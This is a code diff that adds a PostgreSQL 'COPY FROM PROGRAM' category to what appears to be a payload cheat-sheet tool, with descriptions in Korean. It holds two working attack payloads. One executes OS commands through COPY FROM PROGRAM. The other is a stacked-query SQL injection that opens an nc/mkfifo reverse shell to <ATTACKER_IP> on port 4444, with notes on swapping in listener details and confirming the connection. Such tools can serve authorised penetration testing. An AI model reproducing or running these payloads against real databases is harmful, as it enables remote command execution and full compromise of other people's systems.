@@ -124,6 +124,28 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
     ],
   },
   {
+    id: "postgres-copy-program",
+    title: "PostgreSQL COPY FROM PROGRAM",
+    engines: ["postgresql"],
+    description: "superuser 권한 계정에서만 동작합니다(pg_read_server_files 등 관련 롤도 확인). " +
+      "COPY ... FROM PROGRAM은 DB 프로세스 권한으로 임의 OS 명령을 실행합니다 -- 명령 자리에 " +
+      "리버스 쉘 페이로드(리버스 쉘 탭의 nc-mkfifo 등)를 넣으면 그대로 셸 연결로 이어집니다.",
+    payloads: [
+      { label: "명령 실행 + 결과 조회 (이미 쿼리 인터페이스가 있는 경우)",
+        payload: "CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'whoami'; " +
+          "SELECT * FROM cmd_exec;",
+        note: "결과를 응답에서 바로 읽을 수 있을 때 (관리 콘솔, UNION 등). " +
+          "테이블이 이미 있으면 DROP TABLE IF EXISTS cmd_exec;를 앞에 추가하세요." },
+      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
+        payload: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); " +
+          "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
+          "nc <ATTACKER_IP> 4444 >/tmp/f';--",
+        note: "<ATTACKER_IP>/4444 및 nc 명령 자체는 리버스 쉘 탭에서 LHOST/LPORT로 직접 생성한 뒤 " +
+          "COPY ... FROM PROGRAM '...' 안에 그대로 넣어 바꿔치기하세요. 결과가 응답에 안 보여도 " +
+          "상관없습니다 -- 리스너에 연결되는지로 성공 여부를 확인하면 됩니다." },
+    ],
+  },
+  {
     id: "waf-bypass",
     title: "필터·WAF 우회",
     engines: ["generic"],
